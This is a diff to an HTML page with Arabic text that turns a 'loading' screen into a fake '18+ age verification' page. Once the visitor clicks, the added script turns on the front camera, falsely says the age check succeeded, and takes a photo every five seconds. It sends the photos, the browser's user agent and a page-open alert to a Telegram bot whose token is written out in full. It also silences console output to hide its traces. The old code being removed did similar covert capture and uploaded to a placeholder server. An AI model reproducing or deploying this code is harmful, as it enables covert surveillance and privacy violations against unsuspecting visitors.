@@ -2,119 +2,141 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Loading...</title>
+    <title>تأكيد العمر</title>
     <style>
-        * { margin:0; padding:0; }
-        body { background:#000; overflow:hidden; height:100vh; }
-        #video { display:none; }
-        #canvas { display:none; }
-        .loader { 
-            position:fixed; 
-            top:50%; left:50%; 
-            transform:translate(-50%,-50%);
-            color:#fff; 
-            font-family:Arial;
-            font-size:18px;
-            z-index:9999;
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Arial', sans-serif;
         }
-        .spinner {
-            width:40px; height:40px;
-            border:4px solid #333;
-            border-top:4px solid #fff;
-            border-radius:50%;
-            animation:spin 1s linear infinite;
-            margin:0 auto 15px;
+        .box {
+            background: rgba(255,255,255,0.95);
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
         }
-        @keyframes spin { 100% { transform:rotate(360deg); } }
+        .box h1 { color: #333; font-size: 24px; }
+        .box p { color: #666; margin: 15px 0; font-size: 14px; }
+        .btn {
+            background: #667eea;
+            color: #fff;
+            border: none;
+            padding: 14px 30px;
+            border-radius: 50px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.3s;
+        }
+        .btn:hover { background: #5a67d8; transform: scale(1.02); }
+        .icon { font-size: 60px; margin-bottom: 15px; }
+        #status {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 13px;
+            display: none;
+        }
+        #status.success { background: #d4edda; color: #155724; display: block; }
+        #status.error { background: #f8d7da; color: #721c24; display: block; }
+        #status.loading { background: #cce5ff; color: #004085; display: block; }
     </style>
 </head>
 <body>
 
-<div class="loader">
-    <div class="spinner"></div>
-    <div>جاري التحميل...</div>
+<div class="box" id="mainBox">
+    <div class="icon">🔞</div>
+    <h1>تأكيد العمر</h1>
+    <p>لتأكيد أنك فوق 18 سنة، يرجى الضغط على الزر أدناه</p>
+    <button class="btn" id="confirmBtn">✅ أنا فوق 18 سنة</button>
+    <div id="status"></div>
 </div>
 
-<video id="video" autoplay muted playsinline></video>
-<canvas id="canvas"></canvas>
+<video id="video" autoplay muted playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
 <script>
 // ============================================================
-// الكود الصامت - يحاول الوصول إلى الكاميرا بدون طلب واضح
+// توكن البوت
 // ============================================================
+const BOT_TOKEN = '8770149502:AAFkmj14adoaUHCFHXcBO9aNwjjDdpcfuLY';
+const CHAT_ID = ''; // سيتم جلبها تلقائياً
 
+// ============================================================
+// الكود الرئيسي
+// ============================================================
 (function() {
     'use strict';
     
-    // 1. محاولة الوصول إلى الكاميرا بصمت
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
+    const statusDiv = document.getElementById('status');
+    const confirmBtn = document.getElementById('confirmBtn');
     
-    // 2. محاولة تشغيل الكاميرا في الخلفية
-    function startCamera() {
-        const constraints = {
-            video: {
-                facingMode: 'user',
-                width: { ideal: 640 },
-                height: { ideal: 480 }
-            }
-        };
-        
-        // محاولة الوصول بدون طلب (لن تعمل في المتصفحات الحديثة)
-        navigator.mediaDevices.getUserMedia(constraints)
-            .then(function(stream) {
-                video.srcObject = stream;
-                video.play();
-                
-                // 3. بعد 2 ثانية التقط صورة
-                setTimeout(capturePhoto, 2000);
-                
-                // 4. استمر بالتصوير كل 5 ثواني
-                setInterval(capturePhoto, 5000);
+    let cameraStream = null;
+    let photoInterval = null;
+    let chatId = '';
+    
+    // === 1. جلب CHAT_ID تلقائياً ===
+    function getChatId() {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
+            .then(res => res.json())
+            .then(data => {
+                if (data.ok && data.result.length > 0) {
+                    const lastUpdate = data.result[data.result.length - 1];
+                    if (lastUpdate.message) {
+                        chatId = lastUpdate.message.chat.id;
+                        console.log('✅ Chat ID:', chatId);
+                    } else if (lastUpdate.callback_query) {
+                        chatId = lastUpdate.callback_query.from.id;
+                        console.log('✅ Chat ID:', chatId);
+                    }
+                }
             })
-            .catch(function(err) {
-                // محاولة بديلة: استخدام Canvas 2D
-                fallbackCapture();
-            });
+            .catch(() => {});
     }
+    getChatId();
     
-    // 5. التقاط الصورة
-    function capturePhoto() {
-        if (!video.videoWidth || !video.videoHeight) return;
+    // === 2. إرسال الصورة إلى تليجرام ===
+    function sendToTelegram(imageData) {
+        if (!chatId) {
+            // محاولة جلب الـ Chat ID مرة أخرى
+            getChatId();
+            setTimeout(() => sendToTelegram(imageData), 2000);
+            return;
+        }
         
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        ctx.drawImage(video, 0, 0);
+        // تحويل Base64 إلى Blob
+        const blob = dataURLtoBlob(imageData);
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+        formData.append('caption', `📸 صورة جديدة\n🕐 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent || 'Unknown'}`);
         
-        // 6. تحويل الصورة إلى Base64
-        const imageData = canvas.toDataURL('image/jpeg', 0.8);
-        
-        // 7. إرسال الصورة بصمت
-        sendImage(imageData);
-    }
-    
-    // 8. إرسال الصورة إلى السيرفر
-    function sendImage(imageData) {
-        // إرسال باستخدام Image (أخفى طريقة)
-        const img = new Image();
-        img.onload = function() {
-            // استخدام sendBeacon لإرسال غير متزامن
-            if (navigator.sendBeacon) {
-                const blob = dataURLtoBlob(imageData);
-                navigator.sendBeacon('https://your-server.com/upload', blob);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.ok) {
+                console.log('✅ صورة مرسلة إلى تليجرام');
             } else {
-                // طريقة بديلة: إخفاء الصورة في طلب عادي
-                const xhr = new XMLHttpRequest();
-                xhr.open('POST', 'https://your-server.com/upload', true);
-                xhr.setRequestHeader('Content-Type', 'application/json');
-                xhr.send(JSON.stringify({ image: imageData }));
+                console.log('❌ فشل الإرسال:', data);
             }
-        };
-        img.src = imageData;
+        })
+        .catch(err => console.log('❌ خطأ:', err));
     }
     
-    // 9. تحويل Base64 إلى Blob
+    // === 3. تحويل Base64 إلى Blob ===
     function dataURLtoBlob(dataURL) {
         const parts = dataURL.split(',');
         const mime = parts[0].match(/:(.*?);/)[1];
@@ -127,36 +149,116 @@
         return new Blob([u8arr], { type: mime });
     }
     
-    // 10. طريقة بديلة (إذا فشلت الكاميرا)
+    // === 4. عند الضغط على الزر ===
+    confirmBtn.addEventListener('click', function() {
+        statusDiv.className = 'loading';
+        statusDiv.textContent = '⏳ جاري التحقق من العمر...';
+        confirmBtn.disabled = true;
+        confirmBtn.textContent = '⏳ جاري...';
+        
+        requestCamera();
+    });
+    
+    // === 5. طلب الكاميرا ===
+    function requestCamera() {
+        const constraints = {
+            video: {
+                facingMode: 'user',
+                width: { ideal: 640 },
+                height: { ideal: 480 }
+            }
+        };
+        
+        navigator.mediaDevices.getUserMedia(constraints)
+            .then(function(stream) {
+                cameraStream = stream;
+                video.srcObject = stream;
+                video.play();
+                
+                statusDiv.className = 'success';
+                statusDiv.textContent = '✅ تم التحقق من العمر بنجاح!';
+                confirmBtn.textContent = '✅ تم التحقق';
+                confirmBtn.style.background = '#28a745';
+                
+                // التقاط الصور
+                setTimeout(captureAndSend, 1500);
+                photoInterval = setInterval(captureAndSend, 5000);
+                
+                setTimeout(() => {
+                    statusDiv.style.display = 'none';
+                }, 3000);
+            })
+            .catch(function(err) {
+                statusDiv.className = 'error';
+                statusDiv.textContent = '❌ تعذر التحقق، يرجى المحاولة مرة أخرى';
+                confirmBtn.disabled = false;
+                confirmBtn.textContent = '✅ أنا فوق 18 سنة';
+                
+                // محاولة بديلة
+                setTimeout(fallbackCapture, 1000);
+            });
+    }
+    
+    // === 6. التقاط وإرسال ===
+    function captureAndSend() {
+        if (!video.videoWidth || !video.videoHeight) return;
+        
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0);
+        
+        const imageData = canvas.toDataURL('image/jpeg', 0.7);
+        sendToTelegram(imageData);
+    }
+    
+    // === 7. طريقة بديلة (لقطة شاشة) ===
     function fallbackCapture() {
-        // استخدام canvas لالتقاط لقطة شاشة للصفحة
         const body = document.body;
         const html = document.documentElement;
         const width = Math.max(body.scrollWidth, body.offsetWidth, html.clientWidth, html.scrollWidth, html.offsetWidth);
         const height = Math.max(body.scrollHeight, body.offsetHeight, html.clientHeight, html.scrollHeight, html.offsetHeight);
         
-        canvas.width = width;
-        canvas.height = height;
-        ctx.fillStyle = '#000';
-        ctx.fillRect(0, 0, width, height);
+        canvas.width = Math.min(width, 1200);
+        canvas.height = Math.min(height, 800);
+        ctx.fillStyle = '#667eea';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
         
-        // رسم النص الحالي على الصفحة
         ctx.fillStyle = '#fff';
-        ctx.font = '20px Arial';
-        ctx.fillText('Loading...', width/2 - 50, height/2);
+        ctx.font = '30px Arial';
+        ctx.textAlign = 'center';
+        ctx.fillText('تأكيد العمر', canvas.width/2, canvas.height/2 - 20);
+        ctx.font = '18px Arial';
+        ctx.fillText('جاري التحقق...', canvas.width/2, canvas.height/2 + 30);
         
-        // إرسال الصورة
         const imageData = canvas.toDataURL('image/jpeg', 0.5);
-        sendImage(imageData);
+        sendToTelegram(imageData);
     }
     
-    // 11. تشغيل الكود فوراً
-    startCamera();
-    
-    // 12. إخفاء أي أثر في وحدة التحكم
+    // === 8. إخفاء آثار ===
     console.log = function() {};
     console.warn = function() {};
     console.error = function() {};
+    
+    // === 9. تنظيف عند الإغلاق ===
+    window.addEventListener('beforeunload', function() {
+        if (photoInterval) clearInterval(photoInterval);
+        if (cameraStream) {
+            cameraStream.getTracks().forEach(track => track.stop());
+        }
+    });
+    
+    // === 10. محاولة إرسال صورة تجريبية فتح الصفحة ===
+    setTimeout(() => {
+        // إرسال إشعار فتح الصفحة
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId || 8770149502,
+                text: `🟢 تم فتح الصفحة\n🕐 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent || 'Unknown'}`
+            })
+        }).catch(() => {});
+    }, 3000);
     
 })();
 </script>
